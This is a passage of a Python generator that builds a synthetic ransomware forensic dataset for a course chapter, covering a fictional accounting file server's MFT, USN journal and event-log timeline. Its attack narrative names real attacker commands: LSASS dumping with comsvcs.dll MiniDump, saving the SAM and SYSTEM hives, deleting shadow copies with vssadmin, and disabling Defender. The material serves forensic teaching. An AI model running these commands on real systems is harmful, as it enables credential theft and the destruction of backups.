#!/usr/bin/env python3
"""Deterministic generator for the simulated ACCT-FS01 ransomware dataset.

Attack narrative
================
``ACCT-FS01`` is a Windows Server 2019 accounting file server (``10.0.6.15``,
domain ``FINANCE``). It is the scenario host for Chapter 12 — Ransomware
Incident Response — and for Lab 12.

The intrusion runs six days:

* **2024-11-06 21:03–21:46 UTC** — a credential brute force from
  ``45.147.230.19`` hammers the service account ``svc-backup`` over
  internet-exposed RDP on the jump host ``JUMP-01`` (``10.0.2.28``).
  212 failed logons (Security 4625, LogonType 10) are followed by one
  success (4624, LogonType 10) at 21:47:22. The domain controller
  ``FINANCE-DC01`` records the same burst as 212 NTLM validation failures
  (4776, status ``0xC000006A``) plus the matching success.
* **2024-11-07** — discovery from the jump host: ``whoami /groups``,
  ``net view``, ``nltest /dclist:``, ``systeminfo``, and SoftPerfect
  Network Scanner (``netscan.exe``).
* **2024-11-08** — credential access: ``rundll32.exe comsvcs.dll, MiniDump``
  against LSASS and ``reg save`` of the SAM/SYSTEM hives. From here the
  domain admin account ``a-mbrennan`` starts appearing in the DC log
  alongside ``svc-backup`` — the mid-timeline account change described in
  Chapter 12 §12.2.3.
* **2024-11-09 01:19** — lateral movement to ACCT-FS01. A PsExec-style
  service (``PSEXESVC``) is installed (System 7045); RDP sessions from
  ``JUMP-01`` follow (TerminalServices-LocalSessionManager 21/22/25 and
  RemoteConnectionManager 1149).
* **2024-11-10 23:41** — persistence: a bogus ``VaultUpd`` service (System
  7045) and a ``HKLM\\...\\Run`` value pointing at
  ``C:\\Windows\\Temp\\wu\\rclone.exe``.
* **2024-11-11 21:14–22:38** — collection and staging. 12 split 7-Zip
  volumes are written into ``C:\\Windows\\Temp\\wu\\``. Defender gets a
  path exclusion for that directory mid-staging (Defender 5007 at 21:52:41).
* **2024-11-11 22:41 – 2024-11-12 00:52** — exfiltration. ``rclone.exe``
  pushes the staged archives to ``185.220.101.44:443`` across 14 sessions.
* **2024-11-12 02:02:18** — Defender real-time protection disabled
  (Defender 5001 / 5007; the ``Set-MpPreference`` command line survives in
  PowerShell 4104).
* **2024-11-12 02:06:33** — ``vssadmin delete shadows /all /quiet``. The
  4688 for it is **lost** to the later log clear; the evidence that
  survives is the ``VSSADMIN.EXE`` Prefetch entry and four ``volsnap``
  EID 25 records in the System log.
* **2024-11-12 02:09:41** — the Security log is cleared (EID 1102,
  ``svc-backup``). This is the **earliest surviving record** in
  ``security-evtx.csv``; everything before it has to be reconstructed
  from the DC, the jump host, the operational channels, NTFS, Prefetch,
  ShimCache, Amcache and SRUM.
* **2024-11-12 02:14:06 – 03:38:41** — encryption. ``vault.exe`` renames
  418 files to ``.vaulted`` across 24 directories and drops
  ``RECOVER-YOUR-FILES.txt`` in each one. The encryptor and the staging
  directory are deleted afterwards (03:39:12 / 03:41:22).

Everything in this dataset is synthetic. The ransomware family "Vault",
the ``.vaulted`` extension, the victim ID, the contact URL, the accounts,
the hosts and the IP addresses are all fictional and used only for
teaching.

Outputs
=======
This script regenerates every file under ``Data/ACCT-FS01/``. Hand-coded
"key event" rows carry the attack story; seeded pseudo-random rows fill
out plausible volumes (the 418-file encrypted set, the file-server
background churn, the brute-force burst). Output is byte-identical
across runs given the same ``RANDOM_SEED``.

Usage
=====
    python3 generate.py                     # write files in current dir
    python3 generate.py --dry-run           # print plan only
    python3 generate.py --out-dir /tmp/x    # write to scratch dir
    python3 generate.py --seed 0x1234       # different pseudo-random stream
"""

from __future__ import annotations

import argparse
import csv
import sys
import zlib
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Callable, Dict, List, Tuple

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Fixed seed -> byte-identical output across runs. Spelled as a hex literal
# reading "0ACCF501" (ACCT-FS01 with the letters mapped onto legal hex
# digits). Override with --seed for a different stream.
RANDOM_SEED = 0x0ACCF501

# --- Hosts and identities --------------------------------------------------
HOSTNAME = "ACCT-FS01"
FQDN = "acct-fs01.finance.local"
DOMAIN = "FINANCE"
HOST_IP = "10.0.6.15"
OS_CAPTION = "Windows Server 2019 Standard"

JUMP_HOST = "JUMP-01"
JUMP_FQDN = "jump-01.finance.local"
JUMP_IP = "10.0.2.28"

DC_HOST = "FINANCE-DC01"
DC_FQDN = "finance-dc01.finance.local"
DC_IP = "10.0.0.10"

BACKUP_HOSTS = ["BKP-SRV01", "BKP-SRV02", "BKP-SRV03"]
BACKUP_IPS = ["10.0.6.41", "10.0.6.42", "10.0.6.43"]

SVC_ACCOUNT = "svc-backup"
SVC_SID = "S-1-5-21-2088741334-1290117761-3244201886-1607"
ADMIN_ACCOUNT = "a-mbrennan"
ADMIN_SID = "S-1-5-21-2088741334-1290117761-3244201886-1183"
NORMAL_USERS = ["jrayner", "kdelacroix", "pbowen", "tosei", "mfitzgerald"]

# --- Adversary infrastructure ---------------------------------------------
BRUTE_IP = "45.147.230.19"          # source of the RDP brute force
EXFIL_IP = "185.220.101.44"         # rclone destination
EXFIL_PORT = 443

# --- Ransomware -----------------------------------------------------------
FAMILY = "Vault"
ENC_EXT = "vaulted"
NOTE_NAME = "RECOVER-YOUR-FILES.txt"
NOTE_SIZE = 1873
VICTIM_ID = "VLT-8837-ACCT"
ENCRYPTOR_PATH = "Windows\\Temp"
ENCRYPTOR_NAME = "vault.exe"
ENCRYPTOR_SIZE = 412672

# --- Staging / exfiltration ------------------------------------------------
STAGING_DIR = "Windows\\Temp\\wu"
STAGING_DIR_FULL = "C:\\Windows\\Temp\\wu"
ARCHIVE_STEM = "acct-fs01-data.7z"
ARCHIVE_VOLUMES = 12
ARCHIVE_VOLUME_BYTES = 3221225472            # 3 GiB per full volume
ARCHIVE_LAST_VOLUME_BYTES = 1395864371       # final partial volume
RCLONE_NAME = "rclone.exe"
RCLONE_SIZE = 62894080
EXFIL_SESSIONS = 14
EXFIL_TOTAL_BYTES = 37312004096              # flow bytes-out (incl. overhead)
SRUM_RCLONE_BYTES = 36884201472              # host-side app bytes-sent

# --- Anchor times (UTC) ----------------------------------------------------
T_BRUTE_START = "2024-11-06 21:03:12"
T_BRUTE_END = "2024-11-06 21:46:58"
T_BRUTE_SUCCESS = "2024-11-06 21:47:22"
BRUTE_FAILURES = 212

T_DISCOVERY = "2024-11-07 02:11:40"
T_CREDACCESS = "2024-11-08 01:52:14"
T_LATERAL = "2024-11-09 01:19:44"
T_PERSIST = "2024-11-10 23:41:08"

T_DEFENDER_EXCLUSION = "2024-11-11 21:52:41"
T_STAGING_START = "2024-11-11 21:14:22"
T_STAGING_END = "2024-11-11 22:38:19"
T_EXFIL_START = "2024-11-11 22:41:06"
T_EXFIL_END = "2024-11-12 00:52:44"

T_DEFENDER_OFF = "2024-11-12 02:02:18"
T_VSSADMIN = "2024-11-12 02:06:33"
T_WBADMIN = "2024-11-12 02:10:58"
T_BCDEDIT = "2024-11-12 02:11:19"
T_LOG_CLEAR = "2024-11-12 02:09:41"
T_ENCRYPTOR_DROP = "2024-11-12 02:11:04"
T_ENCRYPTOR_EXEC = "2024-11-12 02:13:52"
T_ENC_START = "2024-11-12 02:14:06"
T_ENC_END = "2024-11-12 03:38:41"
T_ENCRYPTOR_DELETE = "2024-11-12 03:39:12"
T_STAGING_DELETE = "2024-11-12 03:41:22"
T_ACTOR_LOGOFF = "2024-11-12 04:12:44"

# --- Encrypted directory plan ---------------------------------------------
# (volume-relative parent path, file count, size profile).
# Traversal order below IS the encryptor's traversal order; the ransom-note
# $SI Born timestamps reproduce it.
ENCRYPTED_DIRS: List[Tuple[str, int, str]] = [
    ("Shares\\Accounting\\AP\\Invoices\\2024", 38, "office"),
    ("Shares\\Accounting\\AP\\Invoices\\2023", 31, "office"),
    ("Shares\\Accounting\\AR\\Statements", 27, "office"),
    ("Shares\\Accounting\\Payroll\\2024", 24, "office"),
    ("Shares\\Accounting\\Payroll\\2023", 18, "office"),
    ("Shares\\Accounting\\Tax\\2024", 15, "office"),
    ("Shares\\Accounting\\Tax\\2023", 12, "office"),
    ("Shares\\Accounting\\Reconciliation", 22, "office"),
    ("Shares\\Accounting\\Budgets\\FY25", 17, "office"),
    ("Shares\\Accounting\\Vendors", 29, "office"),
    ("Shares\\Accounting\\Audit\\2024", 11, "office"),
    ("Shares\\Accounting\\Archive\\2022", 26, "archive"),
    ("Shares\\Accounting\\Archive\\2021", 21, "archive"),
    ("Shares\\Accounting\\Shared\\Templates", 20, "office"),
    ("Shares\\Finance\\Reports\\Monthly", 19, "office"),
    ("Shares\\Finance\\Reports\\Quarterly", 9, "archive"),
    ("Shares\\Finance\\Forecast", 13, "office"),
    ("Shares\\Finance\\BankRecs", 16, "office"),
    ("Shares\\HR\\Compensation", 10, "office"),
    ("Shares\\HR\\Benefits", 8, "office"),
    ("Shares\\Legal\\Contracts", 14, "office"),
    ("Shares\\Legal\\NDA", 6, "office"),
    ("Shares\\IT\\Backups\\SQL", 5, "db"),
    (f"Users\\{SVC_ACCOUNT}\\Documents", 7, "office"),
]

# Directories deliberately NOT encrypted. The first four are the family's
# standard skip list; the last is the interesting one — a share directory in
# the middle of an encrypted volume that the encryptor never reached.
SKIPPED_DIRS = [
    ("Windows", "encryptor skip list — OS directory"),
    ("Windows\\System32", "encryptor skip list — OS directory"),
    ("Program Files", "encryptor skip list — application directory"),
    ("Program Files (x86)", "encryptor skip list — application directory"),
    ("ProgramData", "encryptor skip list — application data"),
    (STAGING_DIR, "the actor's own staging directory"),
    ("Shares\\Finance\\Reports\\Archive",
     "NOT on any skip list — files were open/locked by a reporting service"),
]

# --- File-name pools -------------------------------------------------------
OFFICE_STEMS = [
    "AP_Invoice", "Remittance", "Statement", "Payroll_Register",
    "Payslip_Batch", "Tax_Return", "VAT_Return", "Recon_Sheet",
    "Budget_Draft", "Vendor_Contract", "Vendor_W9", "Audit_Workpaper",
    "GL_Extract", "Trial_Balance", "Expense_Claim", "Purchase_Order",
    "Credit_Note", "Bank_Rec", "Cashflow", "Forecast_Model",
    "Comp_Band", "Benefits_Enrolment", "MSA_Draft", "NDA_Signed",
    "Aged_Debtors", "Aged_Creditors", "Journal_Entry", "Fixed_Assets",
    "Depreciation", "Intercompany", "Accruals", "Prepayments",
    "Headcount", "Commission_Plan", "Rate_Card", "Cost_Centre",
]
OFFICE_EXTS = ["xlsx", "docx", "pdf", "csv", "xls", "doc", "pptx", "msg"]
ARCHIVE_EXTS = ["zip", "pst", "7z", "bak", "pdf"]
DB_STEMS = ["FINDB_FULL", "FINDB_DIFF", "PAYROLLDB_FULL", "GLDB_FULL",
            "REPORTDB_FULL"]

# --- Background churn ------------------------------------------------------
BACKGROUND_USN_ROWS = 260
# DataExtend records emitted per staged archive volume. Sets the amplitude of
# the staging burst in the per-minute USN histogram.
STAGING_EXTENDS_PER_VOLUME = 68

# ---------------------------------------------------------------------------
# CSV headers
# ---------------------------------------------------------------------------

HEADERS: Dict[str, List[str]] = {
    "mft.csv": [
        "EntryNumber", "ParentEntryNumber", "InUse", "ParentPath",
        "FileName", "Extension", "FileSize", "IsDirectory",
        "Created0x10", "LastModified0x10", "LastRecordChange0x10",
        "LastAccess0x10", "Created0x30", "LastModified0x30",
    ],
    "usn-journal.csv": [
        "USN", "EntryNumber", "ParentEntryNumber", "FileName", "Extension",
        "ParentPath", "FullPath", "UpdateTimestamp", "UpdateReasons",
    ],
    "encrypted-files-inventory.csv": [
        "FullPath", "Directory", "OriginalFileName", "OriginalExtension",
        "EncryptedFileName", "EncryptedExtension", "SizeBytes",
        "OriginalCreatedUtc", "EncryptedModifiedUtc", "NoteInDirectory",
    ],
    "security-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "dc-security-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "jumphost-security-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "system-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "Level", "Description", "Payload",
    ],
    "defender-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "terminalservices-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "powershell-evtx.csv": [
        "RecordNumber", "TimeCreated", "EventID", "Channel", "Provider",
        "Computer", "UserName", "Level", "Description", "Payload",
    ],
    "prefetch.csv": [
        "SourceFilename", "ExecutableName", "Hash", "RunCount", "LastRun",
        "PreviousRun0", "PreviousRun1", "PreviousRun2",
        "FilesCount", "VolumeName", "VolumeSerialNumber", "VolumeCreated",
    ],
    "amcache.csv": [
        "FullPath", "FileExtension", "FileSize", "Sha1", "Sha256",
        "FileVersion", "ProductName", "Publisher",
        "Created", "LastModified", "Compiled", "IsPeFile", "BinaryType",
    ],
    "shimcache.csv": [
        "ControlSet", "CacheEntryPosition", "Path", "LastModifiedTimeUTC",
        "Executed", "Duplicate", "SourceFile",
    ],
    "registry-runkeys.csv": [
        "Hive", "KeyPath", "ValueName", "ValueData", "ValueType",
        "LastWriteTime", "Notes",
    ],
    "network-flow.csv": [
        "FlowStart", "FlowEnd", "SourceIP", "SourcePort", "DestIP",
        "DestPort", "Protocol", "BytesSent", "BytesReceived",
        "PacketsSent", "PacketsReceived", "OwningProcess", "Notes",
    ],
    "srum.csv": [
        "Timestamp", "ApplicationName", "UserSID", "InterfaceLuid",
        "BytesSent", "BytesReceived", "EventTimestamp",
    ],
}

TEXT_FILES = ["ransom-note.txt", "rclone-conf-recovered.txt",
              "vssadmin-list-shadows.txt"]

# ShimCache constants — Server 2019 shares the Windows 10 cache format, so
# AppCompatCacheParser reports Executed=NA on every row. A ShimCache entry is
# evidence of *presence*, never of execution.
SHIMCACHE_CONTROLSET = "1"
SHIMCACHE_EXECUTED = "NA"
SHIMCACHE_SOURCE = "C:\\Windows\\System32\\config\\SYSTEM"

VOL_SERIAL = "3E71C09A"
VOL_GUID = "\\VOLUME{01db2c18-7a44e2b1-}"
VOL_CREATED = "2023-04-18 08:12:04"
IFACE_LUID = "1689399632855040"


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def ts(s: str, frac: str = ".0000000") -> str:
    """Normalize a timestamp string to ``YYYY-MM-DD HH:MM:SS.fffffff``."""
    if not s:
        return ""
    if "." in s:
        head, tail = s.split(".", 1)
        return head + "." + (tail + "0000000")[:7]
    return s + frac


def parse_ts(s: str) -> datetime:
    base = s.split(".", 1)[0]
    return datetime.strptime(base, "%Y-%m-%d %H:%M:%S")


def fmt_ts(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%d %H:%M:%S") + ".%07d" % (dt.microsecond * 10)


def fmt_flow(dt: datetime) -> str:
    """Flow records carry whole-second timestamps (no sub-second field)."""
    return dt.strftime("%Y-%m-%d %H:%M:%S")


def stable_seed(base: int, tag: str) -> int:
    """Seed derived from ``base`` and a label.

    ``hash()`` on ``str`` is salted per process in Python 3, so it cannot be
    used here — ``zlib.crc32`` is stable across interpreter runs, which is
    what makes two separate invocations byte-identical.
    """
    return (base ^ zlib.crc32(tag.encode("utf-8"))) & 0xFFFFFFFF


def hexstr(rng: random.Random, length: int) -> str:
    return "".join(rng.choice("0123456789abcdef") for _ in range(length))


# ---------------------------------------------------------------------------
# The world model
#
# Several outputs (mft.csv, usn-journal.csv, encrypted-files-inventory.csv)
# have to agree exactly on the encrypted file set, its sizes and its
# timestamps. Building that set once, from a seed derived only from the base
# seed, is what keeps them consistent.
# ---------------------------------------------------------------------------

class World:
    """The deterministic model every generator reads from."""

    def __init__(self, seed: int) -> None:
        self.seed = seed
        rng = random.Random(stable_seed(seed, "world"))

        self.enc_start = parse_ts(T_ENC_START)
        self.enc_end = parse_ts(T_ENC_END)
        self.span = (self.enc_end - self.enc_start).total_seconds()

        self.files: List[Dict] = []      # encrypted files, in traversal order
        self.notes: List[Dict] = []      # one ransom note per directory
        self.archives: List[Dict] = []   # staged 7z volumes

        self._build_encrypted_set(rng)
        self._assign_encryption_times()
        self._build_archives()

    # -- encrypted file set -------------------------------------------------

    def _build_encrypted_set(self, rng: random.Random) -> None:
        for dir_path, count, profile in ENCRYPTED_DIRS:
            used = set()
            for _ in range(count):
                if profile == "db":
                    stem = DB_STEMS[len(used) % len(DB_STEMS)]
                    name = f"{stem}_2024{rng.randint(10, 11):02d}" \
                           f"{rng.randint(1, 28):02d}_{rng.randint(1, 6):02d}"
                    ext = "bak"
                    size = rng.randint(8_000_000_000, 24_000_000_000)
                elif profile == "archive":
                    stem = rng.choice(OFFICE_STEMS)
                    name = f"{stem}_{rng.randint(2019, 2022)}" \
                           f"_{rng.randint(1, 999):03d}"
                    ext = rng.choice(ARCHIVE_EXTS)
                    size = rng.randint(4_000_000, 180_000_000)
                else:
                    stem = rng.choice(OFFICE_STEMS)
                    name = f"{stem}_{rng.randint(1000, 9999)}"
                    ext = rng.choice(OFFICE_EXTS)
                    size = rng.randint(18_000, 9_400_000)
                key = f"{name}.{ext}"
                # Keep names unique inside a directory.
                bump = 1
                while key in used:
                    key = f"{name}_{bump}.{ext}"
                    bump += 1
                used.add(key)
                orig_name = key
                created = datetime(2024, 1, 1) + timedelta(
                    days=rng.randint(0, 310),
                    seconds=rng.randint(8 * 3600, 18 * 3600),
                    microseconds=rng.randint(0, 999999),
                )
                self.files.append({
                    "dir": dir_path,
                    "profile": profile,
                    "orig_name": orig_name,
                    "orig_ext": ext,
                    "enc_name": f"{orig_name}.{ENC_EXT}",
                    "size": size,
                    "created": created,
                })

    def _assign_encryption_times(self) -> None:
        """Spread the encryption across the 02:14:06 – 03:38:41 window.

        Cost is dominated by file size, so the five multi-gigabyte SQL
        backups in ``Shares\\IT\\Backups\\SQL`` carve a visible trough into
        the per-minute USN histogram near the end of the run. That is
        deliberate: the curve is not perfectly flat in real cases either.
        """
        costs = [1.0 + f["size"] / (2 * 1024 ** 3) for f in self.files]
        # A ransom note costs a fraction of a file.
        note_cost = 0.35
        total = sum(costs) + note_cost * len(ENCRYPTED_DIRS)

        cursor = 0.0
        idx = 0
        for dir_path, count, _profile in ENCRYPTED_DIRS:
            for _ in range(count):
                cost = costs[idx]
                f = self.files[idx]
                f["t_start"] = self.enc_start + timedelta(
                    seconds=self.span * cursor / total)
                cursor += cost
                f["t_end"] = self.enc_start + timedelta(
                    seconds=self.span * cursor / total)
                idx += 1
            cursor += note_cost
            self.notes.append({
                "dir": dir_path,
                "name": NOTE_NAME,
                "size": NOTE_SIZE,
                "t": self.enc_start + timedelta(
                    seconds=self.span * cursor / total),
            })

    # -- staged archives ----------------------------------------------------

    def _build_archives(self) -> None:
        start = parse_ts(T_STAGING_START)
        end = parse_ts(T_STAGING_END)
        step = (end - start).total_seconds() / ARCHIVE_VOLUMES
        for i in range(ARCHIVE_VOLUMES):
            size = (ARCHIVE_LAST_VOLUME_BYTES
                    if i == ARCHIVE_VOLUMES - 1 else ARCHIVE_VOLUME_BYTES)
            t0 = start + timedelta(seconds=step * i)
            self.archives.append({
                "name": f"{ARCHIVE_STEM}.{i + 1:03d}",
                "size": size,
                "t_create": t0,
                "t_close": t0 + timedelta(seconds=step * 0.92),
            })

    # -- derived totals -----------------------------------------------------

    @property
    def staged_bytes(self) -> int:
        return sum(a["size"] for a in self.archives)

    @property
    def encrypted_bytes(self) -> int:
        return sum(f["size"] for f in self.files)


# ---------------------------------------------------------------------------
# Generators (one per output file)
# ---------------------------------------------------------------------------

def generate_mft(rng: random.Random, world: World) -> List[Dict[str, str]]:
    """MFTECmd-style parse of ``$MFT``.

    Encrypted entries keep their original ``$SI Created`` value — the
    encryptor overwrote and renamed in place rather than creating new files —
    while ``$SI LastModified`` is the encryption time. That asymmetry is the
    single most useful property of the parsed MFT in a ransomware case.
    """
    rows: List[Dict[str, str]] = []
    entry = {"n": 5}
    dir_entries: Dict[str, int] = {}

    def add(parent, in_use, ppath, name, ext, size, is_dir,
            c10, m10, r10=None, a10=None, c30=None, m30=None, force=None):
        n = force if force is not None else entry["n"]
        if force is None:
            entry["n"] += 1
        rows.append({
            "EntryNumber": str(n), "ParentEntryNumber": str(parent),
            "InUse": str(in_use), "ParentPath": ppath, "FileName": name,
            "Extension": ext, "FileSize": str(size),
            "IsDirectory": str(is_dir),
            "Created0x10": ts(c10), "LastModified0x10": ts(m10),
            "LastRecordChange0x10": ts(r10 or m10),
            "LastAccess0x10": ts(a10 or m10),
            "Created0x30": ts(c30 or c10),
            "LastModified0x30": ts(m30 or m10),
        })
        return n

    # --- volume / system ---------------------------------------------------
    entry["n"] = 5
    add(5, True, ".", "$MFT", "", 1073741824, False,
        "2023-04-18 08:12:04.1180000", "2024-11-12 03:41:22.7710000")
    entry["n"] = 9
    add(5, True, ".", "$Extend", "", 0, True,
        "2023-04-18 08:12:04.1180000", "2023-04-18 08:12:04.1180000")

    entry["n"] = 36
    win = add(5, True, ".", "Windows", "", 0, True,
              "2023-04-18 08:14:41", "2024-11-12 03:41:22")
    sys32 = add(win, True, "Windows", "System32", "", 0, True,
                "2023-04-18 08:14:41.5000000", "2024-11-10 04:02:19")
    temp = add(win, True, "Windows", "Temp", "", 0, True,
               "2023-04-18 08:14:41.5000000", "2024-11-12 03:41:22")
    wu = add(temp, False, "Windows\\Temp", "wu", "", 0, True,
             "2024-11-11 20:58:40", "2024-11-12 03:41:22")
    prefetch_dir = add(win, True, "Windows", "Prefetch", "", 0, True,
                       "2023-04-18 08:14:41.5000000",
                       "2024-11-12 03:38:52")
    _ = prefetch_dir
    pf_files = add(5, True, ".", "Program Files", "", 0, True,
                   "2023-04-18 08:16:22", "2024-10-04 11:42:08")
    _ = pf_files
    users = add(5, True, ".", "Users", "", 0, True,
                "2023-04-18 08:18:44", "2024-11-09 01:21:07")
    shares = add(5, True, ".", "Shares", "", 0, True,
                 "2023-04-19 10:04:11", "2024-11-12 03:38:41")

    # --- directory tree for the shares ------------------------------------
    dir_entries["Shares"] = shares
    dir_entries["Users"] = users
    dir_entries["Windows"] = win
    dir_entries["Windows\\System32"] = sys32
    dir_entries["Windows\\Temp"] = temp
    dir_entries[STAGING_DIR] = wu

    all_dirs = sorted({
        "\\".join(p.split("\\")[: i + 1])
        for p, _c, _s in ENCRYPTED_DIRS
        for i in range(len(p.split("\\")))
    } | {p for p, _n in SKIPPED_DIRS if p.startswith("Shares")})

    for d in all_dirs:
        if d in dir_entries:
            continue
        parent_path = "\\".join(d.split("\\")[:-1]) or "."
        parent_entry = dir_entries.get(parent_path, 5)
        dir_entries[d] = add(
            parent_entry, True, parent_path, d.split("\\")[-1], "", 0, True,
            "2023-04-19 10:04:11", "2024-11-12 03:38:41")

    # --- encrypted files ---------------------------------------------------
    for f in world.files:
        parent_entry = dir_entries[f["dir"]]
        add(parent_entry, True, f["dir"], f["enc_name"], ENC_EXT,
            f["size"], False,
            fmt_ts(f["created"]),                 # $SI Created — original
            fmt_ts(f["t_end"]),                   # $SI Modified — encryption
            fmt_ts(f["t_end"]), fmt_ts(f["t_end"]),
            fmt_ts(f["created"]), fmt_ts(f["created"]))

    # --- ransom notes ------------------------------------------------------
    for n in world.notes:
        add(dir_entries[n["dir"]], True, n["dir"], NOTE_NAME, "txt",
            NOTE_SIZE, False, fmt_ts(n["t"]), fmt_ts(n["t"]))

    # --- unencrypted control set (the skipped share directory) ------------
    ctrl_dir = "Shares\\Finance\\Reports\\Archive"
    ctrl_rng = random.Random(stable_seed(world.seed, "mft-control"))
    for i in range(9):
        add(dir_entries[ctrl_dir], True, ctrl_dir,
            f"Reporting_Snapshot_{2023 + (i % 2)}_{i + 1:02d}.xlsx", "xlsx",
            ctrl_rng.randint(240_000, 3_800_000), False,
            "2024-0%d-1%d 09:1%d:00" % (i % 8 + 1, i % 9, i % 9),
            "2024-11-11 18:42:1%d" % (i % 9))

    # --- staging directory (deleted) --------------------------------------
    for a in world.archives:
        add(wu, False, STAGING_DIR, a["name"], "001", a["size"], False,
            fmt_ts(a["t_create"]), fmt_ts(a["t_close"]),
            ts(T_STAGING_DELETE), fmt_ts(a["t_close"]))
    add(wu, False, STAGING_DIR, RCLONE_NAME, "exe", RCLONE_SIZE, False,
        "2024-11-11 20:58:41", "2024-11-11 20:58:41.4820000",
        ts(T_STAGING_DELETE), ts(T_EXFIL_START))
    add(wu, False, STAGING_DIR, "rclone.conf", "conf", 412, False,
        "2024-11-11 21:02:17", "2024-11-11 21:02:17.9110000",
        ts(T_STAGING_DELETE), ts(T_EXFIL_START))
    add(wu, False, STAGING_DIR, "7z.exe", "exe", 1180160, False,
        "2024-11-11 21:09:44", "2024-11-11 21:09:44.2200000",
        ts(T_STAGING_DELETE), ts(T_STAGING_START))
    add(wu, False, STAGING_DIR, "7z.dll", "dll", 1810432, False,
        "2024-11-11 21:09:44", "2024-11-11 21:09:44.3100000",
        ts(T_STAGING_DELETE), ts(T_STAGING_START))

    # --- tooling and the encryptor ----------------------------------------
    add(temp, False, "Windows\\Temp", ENCRYPTOR_NAME, "exe",
        ENCRYPTOR_SIZE, False, ts(T_ENCRYPTOR_DROP),
        ts(T_ENCRYPTOR_DROP), ts(T_ENCRYPTOR_DELETE), ts(T_ENCRYPTOR_EXEC))
    add(temp, False, "Windows\\Temp", "netscan.exe", "exe", 8394752, False,
        "2024-11-09 01:24:11", "2024-11-09 01:24:11.5100000",
        "2024-11-09 03:02:44", "2024-11-09 01:26:58")
    add(sys32, True, "Windows\\System32", "PSEXESVC.exe", "exe", 194112,
        False, ts(T_LATERAL), ts(T_LATERAL),
        "2024-11-09 01:22:18", ts(T_LATERAL))

    # --- normal server content (noise) ------------------------------------
    add(dir_entries[f"Users\\{SVC_ACCOUNT}"], True,
        f"Users\\{SVC_ACCOUNT}", "AppData", "", 0, True,
        "2023-04-19 11:02:14", "2024-11-11 21:02:17")

    return rows


def generate_usn_journal(rng: random.Random, world: World
                         ) -> List[Dict[str, str]]:
    """USN Journal (``$UsnJrnl:$J``) parsed with MFTECmd.

    Five records per encrypted file reproduce the real encrypt-then-rename
    sequence, so the per-minute histogram in the 02:14–03:38 window has the
    shape Chapter 12 §12.3.2 describes.
    """
    recs: List[Tuple[datetime, Dict[str, str]]] = []

    def add(t: datetime, name, ext, ppath, reasons, entry=0, parent=0):
        recs.append((t, {
            "EntryNumber": str(entry), "ParentEntryNumber": str(parent),
            "FileName": name, "Extension": ext, "ParentPath": ppath,
            "FullPath": f"{ppath}\\{name}" if ppath != "." else name,
            "UpdateTimestamp": fmt_ts(t), "UpdateReasons": reasons,
        }))

    # --- the encryption storm ---------------------------------------------
    for f in world.files:
        t0, t1 = f["t_start"], f["t_end"]
        dur = (t1 - t0).total_seconds()
        marks = [t0 + timedelta(seconds=dur * frac)
                 for frac in (0.05, 0.35, 0.72, 0.86, 0.98)]
        add(marks[0], f["orig_name"], f["orig_ext"], f["dir"],
            "DataOverwrite")
        add(marks[1], f["orig_name"], f["orig_ext"], f["dir"],
            "DataOverwrite|DataTruncation")
        add(marks[2], f["orig_name"], f["orig_ext"], f["dir"],
            "DataOverwrite|DataTruncation|RenameOldName")
        add(marks[3], f["enc_name"], ENC_EXT, f["dir"],
            "DataOverwrite|DataTruncation|RenameNewName")
        add(marks[4], f["enc_name"], ENC_EXT, f["dir"],
            "DataOverwrite|DataTruncation|RenameNewName|Close")

    # --- ransom notes ------------------------------------------------------
    for n in world.notes:
        t = n["t"]
        add(t, NOTE_NAME, "txt", n["dir"], "FileCreate")
        add(t + timedelta(milliseconds=40), NOTE_NAME, "txt", n["dir"],
            "FileCreate|DataExtend")
        add(t + timedelta(milliseconds=95), NOTE_NAME, "txt", n["dir"],
            "FileCreate|DataExtend|Close")

    # --- tool delivery -----------------------------------------------------
    for name, ext, ppath, t_create in [
        (RCLONE_NAME, "exe", STAGING_DIR, "2024-11-11 20:58:41"),
        ("rclone.conf", "conf", STAGING_DIR, "2024-11-11 21:02:17"),
        ("7z.exe", "exe", STAGING_DIR, "2024-11-11 21:09:44"),
        ("7z.dll", "dll", STAGING_DIR, "2024-11-11 21:09:46"),
        (ENCRYPTOR_NAME, "exe", "Windows\\Temp", T_ENCRYPTOR_DROP),
        ("netscan.exe", "exe", "Windows\\Temp", "2024-11-09 01:24:11"),
    ]:
        t = parse_ts(t_create)
        add(t, name, ext, ppath, "FileCreate")
        add(t + timedelta(milliseconds=120), name, ext, ppath,
            "FileCreate|DataExtend")
        add(t + timedelta(milliseconds=380), name, ext, ppath,
            "FileCreate|DataExtend|Close")

    add(parse_ts("2024-11-11 20:58:40"), "wu", "", "Windows\\Temp",
        "FileCreate")
    add(parse_ts("2024-11-11 20:58:40.180000"), "wu", "", "Windows\\Temp",
        "FileCreate|Close")

    # --- staging burst -----------------------------------------------------
    # A multi-gigabyte write produces a long run of DataExtend records as the
    # file grows. STAGING_EXTENDS_PER_VOLUME controls the amplitude of the
    # staging burst relative to the encryption storm — deliberately about a
    # third of it, which is the "much lower amplitude" Chapter 12 §12.3.2
    # describes.
    for a in world.archives:
        t0, t1 = a["t_create"], a["t_close"]
        add(t0, a["name"], "001", STAGING_DIR, "FileCreate")
        dur = (t1 - t0).total_seconds()
        for k in range(STAGING_EXTENDS_PER_VOLUME):
            frac = (k + 1) / (STAGING_EXTENDS_PER_VOLUME + 1)
            add(t0 + timedelta(seconds=dur * frac), a["name"], "001",
                STAGING_DIR, "FileCreate|DataExtend")
        add(t1, a["name"], "001", STAGING_DIR,
            "FileCreate|DataExtend|Close")

    # --- cleanup -----------------------------------------------------------
